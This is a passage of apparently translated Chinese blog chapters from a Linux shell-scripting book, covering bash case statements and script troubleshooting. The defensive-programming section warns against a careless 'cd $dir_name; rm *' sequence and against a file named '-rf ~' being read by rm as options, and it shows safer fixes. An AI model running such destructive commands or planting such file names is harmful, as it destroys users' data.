class="keyword">then</span></span><br><span class="line">    <span class="built_in">df</span> -h</span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> == 3 ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="string">&quot;<span class="subst">$(id -u)</span>&quot;</span> -eq 0 ]]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;家目录空间利用率（所有用户）&quot;</span></span><br><span class="line">      <span class="built_in">du</span> -sh /home/*</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;家目录空间利用率（<span class="variable">$USER</span>）&quot;</span></span><br><span class="line">      <span class="built_in">du</span> -sh <span class="string">&quot;<span class="variable">$HOME</span>&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;无效输入。&quot;</span> &gt;&amp;2</span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>使用 case，我们可以用更简单的逻辑替换这段逻辑。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># case-menu: 一个基于菜单的系统信息程序</span></span><br><span class="line">clear</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">请选择：</span></span><br><span class="line"><span class="string">1. 显示系统信息</span></span><br><span class="line"><span class="string">2. 显示磁盘空间</span></span><br><span class="line"><span class="string">3. 显示家目录空间利用率</span></span><br><span class="line"><span class="string">0. 退出</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;输入选择 [0-3] &gt; &quot;</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">  0) <span class="built_in">echo</span> <span class="string">&quot;程序已终止。&quot;</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line">    ;;</span><br><span class="line">  1) <span class="built_in">echo</span> <span class="string">&quot;主机名: <span class="variable">$HOSTNAME</span>&quot;</span></span><br><span class="line">    <span class="built_in">uptime</span></span><br><span class="line">    ;;</span><br><span class="line">  2) <span class="built_in">df</span> -h</span><br><span class="line">	  ;;</span><br><span class="line">  3) <span class="keyword">if</span> [[ <span class="string">&quot;<span class="subst">$(id -u)</span>&quot;</span> -eq 0 ]]; <span class="keyword">then</span></span><br><span class="line">    	<span class="built_in">echo</span> <span class="string">&quot;家目录空间利用率（所有用户）&quot;</span></span><br><span class="line">    	<span class="built_in">du</span> -sh /home/*</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	<span class="built_in">echo</span> <span class="string">&quot;家目录空间利用率（<span class="variable">$USER</span>）&quot;</span></span><br><span class="line">    	<span class="built_in">du</span> -sh <span class="string">&quot;<span class="variable">$HOME</span>&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    ;;</span><br><span class="line">  *) <span class="built_in">echo</span> <span class="string">&quot;无效输入&quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>

<p>case 命令查看 <em>word</em> 的值，在我们的例子中，即 REPLY 变量的值，然后尝试将其与指定的 <em>patterns</em> 匹配。</p>
<p>当找到匹配时，执行与指定模式相关联的 <em>commands</em>。找到匹配后，不会尝试进一步的匹配。</p>
<h4 id="模式"><a href="#模式" class="headerlink" title="模式"></a>模式</h4><p>case 使用的模式与路径名扩展使用的模式相同。模式以“)”字符结束。表31-1列出了有效模式的示例。</p>
<p><em>表31-1:</em> <em>case 模式示例</em></p>
<table>
<thead>
<tr>
<th><strong>模式</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>a)</td>
<td>如果 <em>word</em> 等于 “a” 时匹配。</td>
</tr>
<tr>
<td>[[:alpha:]])</td>
<td>如果 <em>word</em> 是单个字母字符时匹配。</td>
</tr>
<tr>
<td>???)</td>
<td>如果 <em>word</em> 正好是三个字符长时匹配。</td>
</tr>
<tr>
<td>*.txt)</td>
<td>如果 <em>word</em> 以字符 “.txt” 结尾时匹配。</td>
</tr>
<tr>
<td>*)</td>
<td>匹配任何 <em>word</em> 的值。将此作为 case 命令中最后一个模式的做法是一个好习惯，以捕获任何未匹配前一个模式的 <em>word</em> 值，即捕获任何可能的无效值。</td>
</tr>
</tbody></table>
<p>这里是模式工作的一个例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;输入单词 &gt; &quot;</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">  [[:alpha:]]) <span class="built_in">echo</span> <span class="string">&quot;是单个字母字符。&quot;</span> ;;</span><br><span class="line">  [ABC][0-9]) <span class="built_in">echo</span> <span class="string">&quot;是 A, B, 或 C 后跟一个数字。&quot;</span> ;;</span><br><span class="line">  ???) <span class="built_in">echo</span> <span class="string">&quot;是三个字符长。&quot;</span> ;;</span><br><span class="line">  *.txt) <span class="built_in">echo</span> <span class="string">&quot;是以 &#x27;.txt&#x27; 结尾的单词&quot;</span> ;;</span><br><span class="line">  *) <span class="built_in">echo</span> <span class="string">&quot;是其他东西。&quot;</span> ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>

<p>还可以使用竖直条字符作为分隔符来组合多个模式。这创建了一个“或”条件模式。这对于处理大写和小写字符等事情很有用。这里是一个示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># case-menu: 一个基于菜单的系统信息程序</span></span><br><span class="line">clear</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">请选择：</span></span><br><span class="line"><span class="string">A. 显示系统信息</span></span><br><span class="line"><span class="string">B. 显示磁盘空间</span></span><br><span class="line"><span class="string">C. 显示家目录空间利用率</span></span><br><span class="line"><span class="string">Q. 退出</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;输入选择 [A, B, C 或 Q] &gt; &quot;</span> </span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">  q|Q) <span class="built_in">echo</span> <span class="string">&quot;程序已终止。&quot;</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line">    ;;</span><br><span class="line">  a|A) <span class="built_in">echo</span> <span class="string">&quot;主机名: <span class="variable">$HOSTNAME</span>&quot;</span></span><br><span class="line">    <span class="built_in">uptime</span></span><br><span class="line">    ;;</span><br><span class="line">  b|B) <span class="built_in">df</span> -h</span><br><span class="line">	  ;;</span><br><span class="line">  c|C) <span class="keyword">if</span> [[ <span class="string">&quot;<span class="subst">$(id -u)</span>&quot;</span> -eq 0 ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;家目录空间利用率（所有用户）&quot;</span></span><br><span class="line">    	<span class="built_in">du</span> -sh /home/*</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	<span class="built_in">echo</span> <span class="string">&quot;家目录空间利用率（<span class="variable">$USER</span>）&quot;</span></span><br><span class="line">    	<span class="built_in">du</span> -sh <span class="string">&quot;<span class="variable">$HOME</span>&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    ;;</span><br><span class="line">  *) <span class="built_in">echo</span> <span class="string">&quot;无效输入&quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>

<p>在这里，我们修改了 case-menu 程序，使用字母而不是数字进行菜单选择。注意新的模式如何允许输入大写和小写字母。</p>
<h4 id="执行多个动作"><a href="#执行多个动作" class="headerlink" title="执行多个动作"></a>执行多个动作</h4><p>在 bash 4.0 之前的版本中，case 只允许在成功匹配后执行一个动作。成功匹配后，命令将终止。这里我们看到一个测试字符的脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># case4-1: 测试一个字符</span></span><br><span class="line"><span class="built_in">read</span> -n 1 -p <span class="string">&quot;输入一个字符 &gt; &quot;</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line"> [[:upper:]]) <span class="built_in">echo</span> <span class="string">&quot;&#x27;<span class="variable">$REPLY</span>&#x27; 是大写字母。&quot;</span> ;;</span><br><span class="line"> [[:lower:]]) <span class="built_in">echo</span> <span class="string">&quot;&#x27;<span class="variable">$REPLY</span>&#x27; 是小写字母。&quot;</span> ;;</span><br><span class="line"> [[:alpha:]]) <span class="built_in">echo</span> <span class="string">&quot;&#x27;<span class="variable">$REPLY</span>&#x27; 是字母。&quot;</span> ;;</span><br><span class="line"> [[:digit:]]) <span class="built_in">echo</span> <span class="string">&quot;&#x27;<span class="variable">$REPLY</span>&#x27; 是数字。&quot;</span> ;;</span><br><span class="line"> [[:graph:]]) <span class="built_in">echo</span> <span class="string">&quot;&#x27;<span class="variable">$REPLY</span>&#x27; 是可见字符。&quot;</span> ;;</span><br><span class="line"> [[:punct:]]) <span class="built_in">echo</span> <span class="string">&quot;&#x27;<span class="variable">$REPLY</span>&#x27; 是标点符号。&quot;</span> ;;</span><br><span class="line"> [[:space:]]) <span class="built_in">echo</span> <span class="string">&quot;&#x27;<span class="variable">$REPLY</span>&#x27; 是空白字符。&quot;</span> ;;</span><br><span class="line"> [[:xdigit:]]) <span class="built_in">echo</span> <span class="string">&quot;&#x27;<span class="variable">$REPLY</span>&#x27; 是十六进制数字。&quot;</span> ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>

<p>运行这个脚本会产生这样的结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ case4-1</span><br><span class="line">输入一个字符 &gt; a</span><br><span class="line"><span class="string">&#x27;a&#x27;</span> 是小写字母。</span><br></pre></td></tr></table></figure>

<p>脚本在大部分情况下工作正常，但如果一个字符匹配多个 POSIX 字符类，则会失败。例如，字符 “a” 既是小写字母也是字母，以及十六进制数字。在 bash 4.0 之前的版本中，case 无法匹配多于一个测试。现代版本的 bash 添加了 ;;&amp; 符号来终止每个动作，所以现在我们可以这样做：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># case4-2: 测试一个字符</span></span><br><span class="line"><span class="built_in">read</span> -n 1 -p <span class="string">&quot;输入一个字符 &gt; &quot;</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line"> [[:upper:]]) <span class="built_in">echo</span> <span class="string">&quot;&#x27;<span class="variable">$REPLY</span>&#x27; 是大写字母。&quot;</span> ;;&amp;</span><br><span class="line"> [[:lower:]]) <span class="built_in">echo</span> <span class="string">&quot;&#x27;<span class="variable">$REPLY</span>&#x27; 是小写字母。&quot;</span> ;;&amp;</span><br><span class="line"> [[:alpha:]]) <span class="built_in">echo</span> <span class="string">&quot;&#x27;<span class="variable">$REPLY</span>&#x27; 是字母。&quot;</span> ;;&amp;</span><br><span class="line"> [[:digit:]]) <span class="built_in">echo</span> <span class="string">&quot;&#x27;<span class="variable">$REPLY</span>&#x27; 是数字。&quot;</span> ;;&amp;</span><br><span class="line"> [[:graph:]]) <span class="built_in">echo</span> <span class="string">&quot;&#x27;<span class="variable">$REPLY</span>&#x27; 是可见字符。&quot;</span> ;;&amp;</span><br><span class="line"> [[:punct:]]) <span class="built_in">echo</span> <span class="string">&quot;&#x27;<span class="variable">$REPLY</span>&#x27; 是标点符号。&quot;</span> ;;&amp;</span><br><span class="line"> [[:space:]]) <span class="built_in">echo</span> <span class="string">&quot;&#x27;<span class="variable">$REPLY</span>&#x27; 是空白字符。&quot;</span> ;;&amp;</span><br><span class="line"> [[:xdigit:]]) <span class="built_in">echo</span> <span class="string">&quot;&#x27;<span class="variable">$REPLY</span>&#x27; 是十六进制数字。&quot;</span> ;;&amp;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>

<p>当我们运行这个脚本时，我们得到这样的结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ case4-2</span><br><span class="line">输入一个字符 &gt; a</span><br><span class="line"><span class="string">&#x27;a&#x27;</span> 是小写字母。</span><br><span class="line"><span class="string">&#x27;a&#x27;</span> 是字母。</span><br><span class="line"><span class="string">&#x27;a&#x27;</span> 是可见字符。</span><br><span class="line"><span class="string">&#x27;a&#x27;</span> 是十六进制数字。</span><br></pre></td></tr></table></figure>

<p>;;&amp; 语法的添加允许 case 继续执行下一个测试，而不是简单地终止。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h4><p>case 命令是我们编程技巧包中的一个便捷添加。正如我们将在下一章看到的，它是处理某些类型问题的完美工具。</p>
<h4 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a><strong>进一步阅读</strong></h4><ul>
<li><p><em>Bash 参考手册</em>中的条件构造部分详细描述了 case 命令：</p>
<p><span class="exturl" data-url="aHR0cDovL3Rpc3d3dy5jYXNlLmVkdS9waHAvY2hldC9iYXNoL2Jhc2hyZWYuaHRtbCNTRUMyMQ==">http://tiswww.case.edu/php/chet/bash/bashref.html#SEC21<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p><em>高级 Bash-脚本指南</em>提供了更多 case 应用的示例：</p>
<p><span class="exturl" data-url="aHR0cDovL3RsZHAub3JnL0xEUC9hYnMvaHRtbC90ZXN0YnJhbmNoLmh0bWw=">http://tldp.org/LDP/abs/html/testbranch.html<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>故障排除</title>
    <url>/2024/05/30-troubleshooting/</url>
    <content><![CDATA[<h2 id="30-故障排除"><a href="#30-故障排除" class="headerlink" title="30 - 故障排除"></a>30 - 故障排除</h2><p>随着我们的脚本变得更加复杂，现在是时候看看当事情出错时会发生什么了。在本章中，我们将看看脚本中发生的一些常见错误类型，并检查一些有用的技术，这些技术可以用来追踪和根除问题。</p>
<span id="more"></span>

<h3 id="语法错误"><a href="#语法错误" class="headerlink" title="语法错误"></a>语法错误</h3><p>一种通用的错误类别是<em>语法错误</em>。语法错误涉及到错误输入了某些shell语法元素。当遇到这种类型的错误时，shell将停止执行脚本。</p>
<p>在接下来的讨论中，我们将使用这个脚本来演示常见的错误类型：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># trouble: 用于演示常见错误的脚本</span></span><br><span class="line">number=1</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$number</span> = 1 ]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Number is equal to 1.&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Number is not equal to 1.&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>按照上述方式编写，这个脚本可以成功运行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ trouble</span><br><span class="line">Number is equal to 1.</span><br></pre></td></tr></table></figure>

<h4 id="缺少引号"><a href="#缺少引号" class="headerlink" title="缺少引号"></a>缺少引号</h4><p>让我们编辑我们的脚本，从第一个echo命令后的参数中删除尾随引号。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># trouble: 用于演示常见错误的脚本</span></span><br><span class="line">number=1</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$number</span> = 1 ]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Number is equal to 1.</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">	echo &quot;</span>Number is not equal to 1.<span class="string">&quot;</span></span><br><span class="line"><span class="string">fi</span></span><br></pre></td></tr></table></figure>

<p>发生了以下情况：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ trouble</span><br><span class="line">/home/me/bin/trouble: line 10: unexpected EOF <span class="keyword">while</span> looking <span class="keyword">for</span> matching `<span class="string">&quot;&#x27;</span></span><br><span class="line"><span class="string">/home/me/bin/trouble: line 13: syntax error: unexpected end of file</span></span><br></pre></td></tr></table></figure>

<p>它生成了两个错误。有趣的是，错误消息报告的行号并不是缺失引号的位置，而是在程序中的更晚的地方。如果我们跟随程序中缺失引号之后的部分，我们可以看到为什么。bash将继续寻找关闭引号，直到找到一个，它在第二个echo命令紧接后找到了一个。之后，bash变得非常困惑。随后的if命令的语法因为fi语句现在在一个被引用（但未关闭）的字符串内部而破坏了。</p>
<p>在长脚本中，这种类型的错误可能非常难以找到。使用具有语法高亮显示的编辑器将有所帮助，因为在大多数情况下，它将以与其他种类的shell语法不同的方式显示引用字符串。如果安装了完整版本的vim，可以通过输入此命令来启用语法高亮显示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:syntax on</span><br></pre></td></tr></table></figure>

<h4 id="缺失或意外的标记"><a href="#缺失或意外的标记" class="headerlink" title="缺失或意外的标记"></a>缺失或意外的标记</h4><p>另一个常见错误是忘记完成一个复合命令，例如if或while。让我们看看如果我们在if命令中的test后面移除分号会发生什么：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># trouble: 用于演示常见错误的脚本</span></span><br><span class="line">number=1</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$number</span> = 1 ] <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Number is equal to 1.&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Number is not equal to 1.&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>结果是这样的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ trouble</span><br><span class="line">/home/me/bin/trouble: line 9: syntax error near unexpected token `<span class="keyword">else</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">/home/me/bin/trouble: line 9: `else&#x27;</span></span><br></pre></td></tr></table></figure>

<p>再次，错误消息指向的是比实际问题更晚发生的错误。发生的情况真的很有趣。正如我们回忆的那样，if接受命令列表并评估列表中最后一个命令的退出代码。在我们的程序中，我们打算这个列表由单一命令[,]组成，一个test的同义词。[命令将其后的内容视为参数列表；在我们的案例中，那是四个参数：$number,&#x3D;,1和]。去掉分号后，then这个词被添加到参数列表中，这在语法上是合法的。接下来的echo命令也是合法的。它被解释为if将为退出代码评估的另一个命令列表中的命令。接下来遇到的是else，但它是不合适的，因为shell将其识别为<em>保留字</em>（对shell有特殊意义的词）而不是命令的名称，这就是错误消息的原因。</p>
<h4 id="未预料的扩展"><a href="#未预料的扩展" class="headerlink" title="未预料的扩展"></a>未预料的扩展</h4><p>在脚本中可能有只是偶尔出现的错误。有时脚本会运行得很好，而其他时候它会因为扩展的结果而失败。如果我们返回我们的缺失分号并将number的值更改为一个空变量，我们可以演示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># trouble: 用于演示常见错误的脚本</span></span><br><span class="line">number=</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$number</span> = 1 ]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Number is equal to 1.&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Number is not equal to 1.&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>使用此更改运行脚本会产生以下输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ trouble</span><br><span class="line">/home/me/bin/trouble: line 7: [: =: unary operator expected Number is not equal to 1.</span><br></pre></td></tr></table></figure>

<p>我们得到了这个相当神秘的错误消息，然后是第二个echo命令的输出。问题是number变量在test命令中的扩展。当以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[ <span class="variable">$number</span> = 1 ]</span><br></pre></td></tr></table></figure>

<p>在number为空的情况下进行扩展时，结果是这样的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[ = 1 ]</span><br></pre></td></tr></table></figure>

<p>这是无效的，并且生成了错误。&#x3D;操作符是一个二元操作符（它需要两边都有值），但第一个值缺失了，所以test命令期待一个一元操作符（如-z）来替代。进一步，由于测试失败（因为错误），if命令接收到一个非零退出代码并相应地行动，第二个echo命令被执行。</p>
<p>通过在test命令中的第一个参数周围添加引号可以纠正这个问题。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[ <span class="string">&quot;<span class="variable">$number</span>&quot;</span> = 1 ]</span><br></pre></td></tr></table></figure>

<p>然后当扩展发生时，结果将是这样的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[ <span class="string">&quot;&quot;</span> = 1 ]</span><br></pre></td></tr></table></figure>

<p>这产生了正确数量的参数。除了空字符串外，应该在可能展开为包含嵌入空格的多词字符串的值的情况下使用引号，如文件名。</p>
<p><strong>注意：</strong> 除非需要词分割，否则请始终将变量和命令替换包围在双引号内。</p>
<h3 id="逻辑错误"><a href="#逻辑错误" class="headerlink" title="逻辑错误"></a>逻辑错误</h3><p>与语法错误不同，<em>逻辑错误</em>不会阻止脚本运行。脚本将运行，但由于逻辑问题，它不会产生期望的结果。可能有无数种可能的逻辑错误，但这里是脚本中发现的一些最常见的类型：</p>
<ol>
<li>**条件表达式不正确。**很容易错误编码if&#x2F;then&#x2F;else并执行错误的逻辑。有时逻辑会被颠倒，或者它会不完整。</li>
<li>**“偏差一”错误。**在使用计数器编码循环时，可能会忽略循环可能需要从零开始计数，而不是一，以便在正确的点结束计数。这种错误导致循环“超出末端”通过计数太远或循环通过提前一次迭代终止而错过最后一次迭代。</li>
<li>**未预料的情况。**大多数逻辑错误都是由程序遇到程序员未预见的数据或情况造成的。正如</li>
</ol>
<p>我们所看到的，这也可以包括未预料的扩展，例如包含嵌入空格的文件名扩展为多个命令参数而不是单个文件名。</p>
<h4 id="防御性编程"><a href="#防御性编程" class="headerlink" title="防御性编程"></a>防御性编程</h4><p>在编程时验证假设是很重要的。这意味着仔细评估脚本所使用的程序和命令的退出状态。这里有一个基于真实故事的例子。一个不幸的系统管理员编写了一个脚本来执行重要服务器上的维护任务。该脚本包含以下两行代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$dir_name</span></span><br><span class="line"><span class="built_in">rm</span> *</span><br></pre></td></tr></table></figure>

<p>只要变量dir_name中命名的目录存在，这两行本身没有问题。但是如果它不存在怎么办？在那种情况下，cd命令失败，脚本继续到下一行并删除当前工作目录中的文件。这根本不是想要的结果！由于这种设计决策，这个不幸的管理员破坏了服务器的一个重要部分。</p>
<p>让我们看看这个设计可以如何改进。首先，最好确保dir_name变量只扩展为一个单词，通过引用它，并使rm的执行依赖于cd的成功。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$dir_name</span>&quot;</span> &amp;&amp; <span class="built_in">rm</span> *</span><br></pre></td></tr></table></figure>

<p>这样，如果cd命令失败，rm命令就不会执行。这更好，但仍然留下了dir_name变量未设置或为空的可能性，这将导致删除用户家目录中的文件。通过检查dir_name确实包含现有目录的名称，也可以避免这种情况。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[[ -d <span class="string">&quot;<span class="variable">$dir_name</span>&quot;</span> ]] &amp;&amp; <span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$dir_name</span>&quot;</span> &amp;&amp; <span class="built_in">rm</span> *</span><br></pre></td></tr></table></figure>

<p>通常，当出现前面所示的情况时，最好包含逻辑以终止脚本并报告错误。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除目录$dir_name中的文件</span></span><br><span class="line"><span class="keyword">if</span> [[ ! -d <span class="string">&quot;<span class="variable">$dir_name</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;没有这样的目录: &#x27;<span class="variable">$dir_name</span>&#x27;&quot;</span> &gt;&amp;2</span><br><span class="line">	<span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> ! <span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$dir_name</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;无法cd到&#x27;<span class="variable">$dir_name</span>&#x27;&quot;</span> &gt;&amp;2</span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> ! <span class="built_in">rm</span> *; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;文件删除失败。检查结果&quot;</span> &gt;&amp;2</span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>在这里，我们检查名称，看它是否是现有的目录，并检查cd命令的成功。如果任何一个失败，就发送描述性错误消息到标准错误，并以一的退出状态终止脚本以指示失败。</p>
<h4 id="注意文件名"><a href="#注意文件名" class="headerlink" title="注意文件名"></a>注意文件名</h4><p>这个文件删除脚本还有另一个问题，虽然不太明显，但可能非常危险。Unix（及类Unix操作系统）在许多人看来，在文件名上有一个严重的设计缺陷。Unix对文件名的限制非常宽松。实际上，只有两个字符不能包含在文件名中。第一个是<code>/</code>字符，因为它用于分隔路径名的元素，第二个是空字符（一个零字节），它在内部用于标记字符串的结尾。其他一切都是合法的，包括空格、制表符、换行符、前导连字符、回车符等。</p>
<p>特别值得关注的是前导连字符。例如，拥有一个名为”-rf ~“的文件是完全合法的。想象一下当该文件名传递给rm时会发生什么。</p>
<p>为了防范这个问题，我们想在文件删除脚本中将<code>rm *</code>命令更改为以下形式：<code>rm ./*</code>。</p>
<p>这将防止以连字符开头的文件名被解释为命令选项。作为一般规则，始终在通配符（如*和?）前加上<code>./</code>，以防止命令误解。这包括像*.pdf和???.mp3这样的情况。</p>
<h3 id="可移植的文件名"><a href="#可移植的文件名" class="headerlink" title="可移植的文件名"></a>可移植的文件名</h3><p>为了确保文件名在多个平台（即，不同类型的计算机和操作系统）之间的可移植性，必须小心限制包含在文件名中的字符。有一个称为POSIX可移植文件名字符集的标准，可以用来最大限度地增加文件名在不同系统间工作的可能性。这个标准相当简单。唯一允许的字符是大写字母A-Z，小写字母a-z，数字0-9，点（.），连字符（-），和下划线（_）。该标准进一步建议文件名不应以连字符开头。</p>
<h4 id="验证输入"><a href="#验证输入" class="headerlink" title="验证输入"></a>验证输入</h4><p>一个良好编程的通用规则是，如果程序接受输入，它必须能够处理它接收到的任何东西。这通常意味着必须仔细筛选输入，以确保只有有效的输入被接受进一步处理。我们在上一章学习read命令时看到了一个例子。一个脚本包含以下测试来验证菜单选择：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[[ <span class="variable">$REPLY</span> =~ ^[0-3]$ ]]</span><br></pre></td></tr></table></figure>

<p>这个测试非常具体。只有当用户输入的字符串是0到3范围内的数字时，它才返回零退出状态。不接受其他任何东西。有时这些测试可能很难编写，但努力是必要的，以产生高质量的脚本。</p>
<h3 id="设计是时间的函数"><a href="#设计是时间的函数" class="headerlink" title="设计是时间的函数"></a>设计是时间的函数</h3><p>当我还是一个学习工业设计的大学生时，一个明智的教授说过，项目上的设计量由给设计师的时间量决定。如果给你五分钟来设计一个“杀死苍蝇的设备”，你设计的是苍蝇拍。如果给你五个月，你可能会设计出一个激光引导的“反苍蝇系统”。</p>
<p>编程也适用同样的原则。如果一个脚本只会被使用一次，且仅由程序员使用，有时一个“快速而脏”的脚本就足够了。这种类型的脚本很常见，应该迅速开发，以使努力变得经济。这样的脚本不需要很多注释和防御性检查。另一方面，如果一个脚本是为了<em>生产使用</em>，即，一个将被反复用于重要任务或多个用户使用的脚本，它需要更加小心的开发。</p>
